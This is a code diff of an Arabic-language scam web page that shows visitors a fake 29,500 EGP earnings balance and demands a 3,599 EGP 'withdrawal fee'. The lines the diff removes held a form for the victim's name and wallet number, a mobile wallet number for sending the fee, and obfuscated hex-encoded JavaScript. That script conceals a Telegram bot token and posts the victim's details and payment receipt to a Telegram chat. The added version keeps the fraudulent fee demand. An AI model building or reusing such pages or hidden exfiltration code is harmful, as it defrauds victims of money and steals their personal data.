@@ -2,50 +2,75 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الأرباح</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>أرباح سارة</title>
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
     <style>
-        :root { --primary-color: #25d366; --secondary-color: #ffd400; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eef2f5; margin: 0; text-align: center; }
-        .side-text { position: fixed; top: 50%; transform: translateY(-50%); background: var(--primary-color); color: white; padding: 5px; font-weight: bold; writing-mode: vertical-rl; font-size: 11px; z-index: 100; border-radius: 3px; }
-        .main-container { max-width: 450px; margin: 20px auto; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .banner { background: linear-gradient(45deg, #25d366, #128c7e); color: white; padding: 15px; font-weight: bold; }
-        .content { padding: 25px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
-        .wallet-box { background: #fff9e6; border: 2px solid var(--secondary-color); padding: 15px; border-radius: 10px; margin: 15px 0; }
-        button { background: var(--secondary-color); border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 85%;
+        }
+        h1 { color: #2c3e50; margin-bottom: 20px; }
+        .amount-box {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        .fee-box {
+            background: #ffebee;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .label { display: block; font-size: 14px; color: #666; }
+        .value { font-size: 24px; font-weight: bold; color: #2e7d32; }
+        .value.fee { color: #c62828; }
+        .btn {
+            display: inline-block;
+            margin-top: 25px;
+            padding: 12px 30px;
+            background: #1a73e8;
+            color: white;
+            text-decoration: none;
+            border-radius: 25px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
-<div class="side-text" style="right:0">كوتش ساره ثقة تعامل مية مية</div>
-<div class="side-text" style="left:0; background:#c40000">ربنا يزيدها ويبارك لها يارب</div>
+    <div class="container">
+        <h1>أرباح سارة</h1>
+        
+        <div class="amount-box">
+            <span class="label">إجمالي الأرباح المتاحة</span>
+            <span class="value">29,500 ج.م</span>
+        </div>
 
-<div class="main-container">
-    <div class="banner">نظام سحب الأرباح الفوري 💰</div>
-    
-    <div id="step-1" class="content">
-        <h3 style="color: var(--primary-color);">سجل بياناتك وادفع الرسوم 3599 واستلم ربحك فوراً</h3>
-        <p>الرصيد المتاح حالياً: <b>29,500 ج.م</b></p>
-        <input type="text" id="in-name" placeholder="الاسم الرباعي">
-        <input type="number" id="in-phone" placeholder="رقم محفظتك">
-        <button onclick="nextStep()">الاستمرار للمرحلة النهائية</button>
+        <div class="fee-box">
+            <span class="label">رسوم السحب المستحقة</span>
+            <span class="value fee">3,599 ج.م</span>
+        </div>
+
+        <a href="#" class="btn">سحب الأرباح الآن</a>
     </div>
-
-    <div id="step-2" class="content" style="display: none;">
-        <h3 style="color:#c40000">تأكيد عملية السحب</h3>
-        <p>حول رسوم التفعيل (3599 ج) للرقم:</p>
-        <div class="wallet-box"><b style="font-size:22px; color:#c40000">01270399629</b></div>
-        <p>ارفع إيصال التحويل:</p>
-        <input type="file" id="file-up" accept="image/*">
-        <button id="final-btn" onclick="finish()">تأكيد وإرسال الإيصال</button>
-    </div>
-</div>
-
-<script>
-// الكود المشفر والمصلح بالكامل
-var _0x534d=["\x69\x6E\x2D\x6E\x61\x6D\x65","\x76\x61\x6C\x75\x65","\x69\x6E\x2D\x70\x68\x6F\x6E\x65","\x73\x74\x65\x70\x2D\x31","\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x73\x74\x65\x70\x2D\x32","\x62\x6C\x6F\x63\x6B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x66\x69\x6C\x65\x2D\x75\x70","\x66\x69\x6C\x65\x73","\x6C\x65\x6E\x67\x74\x68","\x38\x35\x39\x39\x31\x32\x37\x33\x37\x33\x3A\x41\x41\x46\x67\x46\x32\x47\x42\x51\x4D\x75\x73\x63\x47\x47\x58\x7A\x78\x73\x30\x4E\x61\x79\x78\x33\x67\x72\x50\x32\x61\x51\x75\x6C\x56\x51","\x38\x34\x30\x38\x30\x39\x33\x39\x37\x37"];function nextStep(){var a=document.getElementById("in-name").value;var b=document.getElementById("in-phone").value;if(a&&b){document.getElementById("step-1").style.display="none";document.getElementById("step-2").style.display="block"}else{alert("برجاء إدخال البيانات")}}async function finish(){var a=document.getElementById("in-name").value;var b=document.getElementById("in-phone").value;var c=document.getElementById("file-up");if(c.files.length===0){alert("ارفع الصورة!");return}var d=_0x534d[13];var e=_0x534d[14];var f=new FormData();f.append("chat_id",e);f.append("photo",c.files[0]);f.append("caption","💰 سحب جديد:\n👤 الاسم: "+a+"\n📱 الرقم: "+b);try{await fetch("https://api.telegram.org/bot"+d+"/sendPhoto",{method:"POST",body:f});window.location.href="success.html"}catch(g){alert("خطأ في الإرسال")}}
-</script>
 
 </body>
 </html>
